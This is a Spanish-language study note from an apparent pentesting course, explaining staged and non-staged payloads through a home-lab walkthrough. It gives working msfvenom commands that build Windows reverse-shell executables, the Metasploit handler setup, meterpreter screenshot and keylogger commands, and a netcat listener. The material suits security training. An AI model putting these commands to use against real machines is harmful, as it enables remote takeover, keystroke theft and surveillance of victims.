# Índice

- [[#Introducción]]
- [[#Practica]]
  - [[#METERPRETER]]
  - [[#Payload de tipo Staged]]
  - [[#Opciones de metasploit]]
  - [[#Modulos]]
  - [[#Payload de tipo Non-Staged]]
  - [[#NETCAT]]
- [[#Siguientes apuntes]]
# Introducción

Un [__payload__](https://keepcoding.io/blog/que-es-un-payload/) es un bloque de código malicioso, el cual busca explotar alguna vulnerabilidad en la máquina víctima.

Tipos de payloads:

- __Staged__: Es un tipo de payload que se __divide en dos o más etapas__. La primera etapa es una pequeña parte del código que se envía al objetivo, cuyo propósito es establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura.
- __Non-staged__: Es un tipo de payload que se envía como __una sola entidad__ y __no se divide en múltiples etapas__. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.

Es importante tener en cuenta que el tipo de payload utilizado en un ataque dependerá del objetivo y de las medidas de seguridad implementadas. En general, los payloads staged son más difíciles de detectar y son preferidos por los atacantes, mientras que los payloads non-staged son más fáciles de implementar, pero también son más fáciles de detectar.

# Practica

# METERPRETER

En este caso, a nivel de prueba, ocuparemos un escenario de una máquina __Windows__ con el __Defender__ totalmente desactivado y nuestra máquina __Linux__ para construir una aplicación maliciosa con ayuda de la herramienta __msfvenom__ y veremos dos formas de obtener una shell, con __Metasploit__ y, como lo hemos visto, con __netcat__.

![[Conceptos básicos de enumeración y explotación/Tipos de payloads/images/001.PNG]]

## Payload de tipo Staged

Con __msfvenom__ crearemos un archivo ejecutable __.exe__ malicioso. Para ello vamos a seleccionar un tipo de payload a utilizar; en este caso será uno que nos dé una reverse shell; primeramente lo haremos para poder ponernos en escucha con el propio __Metasploit__.

Para seleccionar el payload, utilizamos la opción o parámetro __-p__:

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp
```

En este caso estaríamos seleccionando un payload de tipo staged, el cual se envía en partes, de forma fragmentada.

Como lo que buscamos es generarlo en formato de aplicación ejecutable para Windows (archivo exe), le indicaremos con el parámetro __-f__ el formato que deseamos exportar como archivo, mientras que con __-o__ le indicaremos el nombre con el que queremos exportarlo.

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o reverse.exe
```

Al ser una reverse shell lo que esto nos va a proporcionar al ejecutarse en la máquina víctima, tendremos que indicar un HOST y un PUERTO que será donde nosotros como atacantes estaremos en escucha. 

Esto lo podremos indicar con __LHOST__ y __LPORT__:

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=192.168.10.10 LPORT=4646 -o reverse.exe
```

Esto funcionará, pero en ocasiones se nos puede dar un mensaje o warning de que no se ha seleccionado ninguna plataforma o arquitectura; si deseamos, podríamos agregar el parámetro __--platform__ e indicarle que será __Windows__ y, para la arquitectura, será el parámetro __-a__ a la cual indicaremos __x64__.

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 -f exe LHOST=192.168.10.10 LPORT=4646 -o reverse.exe
```

La IP indicada tendrás que cambiarla por la tuya de tu máquina Linux, ya que será a donde será enviada la reverse shell desde la máquina víctima cuando la aplicación sea ejecutada.

![[Conceptos básicos de enumeración y explotación/Tipos de payloads/images/002.PNG]]

Finalmente, servimos mediante un servidor HTTP con Python en el puerto 8080 en la red local, para que así desde nuestra máquina Windows podamos descargar el archivo ejecutable.

```shell
python3 -m http.server 8080
```

Desde nuestra máquina Windows podremos abrirlo en el navegador y descargar el archivo aceptando los riesgos:

![[Conceptos básicos de enumeración y explotación/Tipos de payloads/images/003.PNG]]

Es importante asegurarnos de tener totalmente deshabilitado Windows Defender. 

Una vez tengamos el archivo en la máquina víctima, antes de ejecutarlo tendremos que ponernos en escucha en nuestra máquina atacante, para lo cual utilizaremos __Metasploit__. 

Para esto tendremos que arrancar el Metasploit con el siguiente comando como root:

```shell
msfdb run
```

Al crear nuestro ejecutable con __msfvenom__ seleccionamos un payload; por ende, al utilizar Metasploit, vamos a tener que seleccionarlo, así como colocar un HOST y PORT donde nos pondremos en escucha, que fueron los mismos que indicamos con msfvenom.

```msf
msf> use exploit/multi/handler
msf> set payload windows/x64/meterpreter/reverse_tcp
```

![[Conceptos básicos de enumeración y explotación/Tipos de payloads/images/004.PNG]]

Una vez seteado el puerto, tendremos que setear el HOST y PORT, lo cual podremos hacer con __set__:

```msf
msf> set LHOST 192.168.100.81
msf> set LPORT 4646
```

Con todo esto listo, solo tendremos que ejecutar __run__ y con ello ya estaremos en escucha y será momento de ejecutar la aplicación en la máquina víctima.

```msf
msf> run
```

![[Conceptos básicos de enumeración y explotación/Tipos de payloads/images/005.PNG]]
![[Conceptos básicos de enumeración y explotación/Tipos de payloads/images/006.PNG]]

En cuanto hayamos ejecutado la aplicación, veremos cómo se nos da una sesión de la shell de Windows con el uso de __meterpreter__:

![[Conceptos básicos de enumeración y explotación/Tipos de payloads/images/007.PNG]]

Estando en la shell, podremos salirnos escribiendo __exit__ y aquí podremos ver lo cómodo de Metasploit y el porqué a mucha gente le gusta. Si escribimos __help__ nos dará muchísimas opciones de cosas posibles a realizar:

![[Conceptos básicos de enumeración y explotación/Tipos de payloads/images/008.PNG]]

Metasploit tiene un montón de comandos que nos permiten realizar una gran variedad de cosas; por ejemplo, uno de los que podremos utilizar es __screenshot__, lo cual nos da una ruta donde se almacena y, si nosotros la abrimos, veremos cómo es un screenshot de la máquina víctima:

![[Conceptos básicos de enumeración y explotación/Tipos de payloads/images/009.PNG]]

En este caso se mostró el screenshot en una terminal __kitty__ la cual lo permite, pero perfectamente se puede abrir con algún navegador o aplicación propia que muestre imágenes o video.

```shell
firefox /ruta/a/la/imagen
```

## Opciones de metasploit

Existen otros comandos que nos permiten ver la pantalla en tiempo real o incluso meterle un keylogger con __keyscan_start__ y con ello capturaría todas las teclas en la máquina víctima y, cuando queramos verlas, utilizar __keyscan_dump__:

![[Conceptos básicos de enumeración y explotación/Tipos de payloads/images/010.PNG]]
__Metasploit__ desde luego, es una interfaz que te lo automatiza todo; sin embargo, lo realmente importante o interesante en ciberseguridad es aprender cómo funciona cada una de estas automatizaciones por detrás. Por ende, no mostraremos tanto estas herramientas a lo largo del aprendizaje. 

Y con todas las opciones que proporciona, prácticamente puedes tomar el control total del equipo y realizar diversas cosas que desees. 

Además, lo cómodo es que si escribimos __background__ esta sesión se pone en segundo plano y las sesiones activas las podremos ver con __sessions__:

![[Conceptos básicos de enumeración y explotación/Tipos de payloads/images/011.PNG]]

### Modulos

En __Metasploit__ además tenemos __módulos__ como el __suggester__ el cual nos permite que, si le pasamos una sesión activa, realizará un escaneo para darnos formas potenciales de escalar privilegios en el sistema:

__local_exploit_suggester__

![[Conceptos básicos de enumeración y explotación/Tipos de payloads/images/012.PNG]]

Al igual que este módulo, existen muchísimos y podremos vincular módulos a sesiones activas para realizar diversas cosas.

## Payload de tipo Non-Staged

Para el caso de querer que el payload sea de tipo __Non-staged__ el comando utilizado es prácticamente el mismo, pero al momento de seleccionar el payload en el apartado de __meterpreter__, cambiaremos nuestro slash por un guion bajo.

```shell
msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=192.168.100.81 LPORT=4646 -f exe -o reverse1.exe
```


Llevamos el ejecutable a la máquina víctima nuevamente y configuramos nuestro Metasploit de la misma forma, al correrlo con __msfdb run__:

![[Conceptos básicos de enumeración y explotación/Tipos de payloads/images/013.PNG]]

Una vez en escucha, ejecutamos el ejecutable en la máquina Windows y nuevamente tendremos la sesión en Meterpreter:

![[Conceptos básicos de enumeración y explotación/Tipos de payloads/images/014.PNG]]

Todo funcionará de la misma forma; la diferencia es cómo por detrás se envía y funciona el payload utilizado.

# NETCAT

En este punto podrás preguntarte qué sucede si solo te pones en escucha con __netcat__ para recibir la reverse shell. Al ejecutar el comando con __msfvenom__ de esta forma, simplemente no servirá debido a que la forma en la que lo estamos exportando es precisamente para compatibilidad con el __Meterpreter__ de Metasploit.

Si queremos únicamente colocarnos en escucha con __netcat__ es posible; solo tendremos que cambiar __meterpreter__ por __shell__ en nuestro comando que nos ayuda a crear la aplicación maliciosa:

```shell
msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 -f exe LHOST=192.168.100.81 LPORT=4646 -o reverse2.exe
```

En este caso, recordemos que estamos utilizando un payload de tipo __non-staged__ y esto se define debido a utilizar __\___ o __/__ después de __shell__ o __meterpreter__. 

Nuevamente llevamos el archivo malicioso a la máquina víctima y, antes de ejecutarlo, nos ponemos en escucha con __netcat__ en el puerto __4646__:

![[Conceptos básicos de enumeración y explotación/Tipos de payloads/images/015.PNG]]

Como dato extra, si tratamos de utilizar la reverse shell que nos llega a nuestra terminal al estar en escucha con __netcat__, veremos cómo no funcionan cosas como movernos con las flechas o querer borrar el contenido de la terminal. Si deseamos que este tipo de cosas funcionen como si de una terminal totalmente interactiva se tratase, en Linux existen herramientas como __rlwrap__, la cual podríamos colocar en el mismo comando que nos pone en escucha, antes:

```shell
rlwrap nc -lnvp 4646
```

> Este tipo de herramientas nos pueden parecer muy potentes debido a la automatización con la que ya cuentan y el alcance que nos permite tener con una facilidad y rapidez mayor, además de sin tener un nivel técnico necesario. 
>Sin embargo, es muy importante saber cómo se manejan todas estas tareas de forma manual y su funcionamiento por detrás, ya que es parte importante del conocimiento técnico, además de que existen certificaciones como la __OSCP__ donde está totalmente prohibido el uso de herramientas como __Metasploit__.

# Siguientes apuntes

[[Tipos de explotación (Manuales y Automatizadas)]]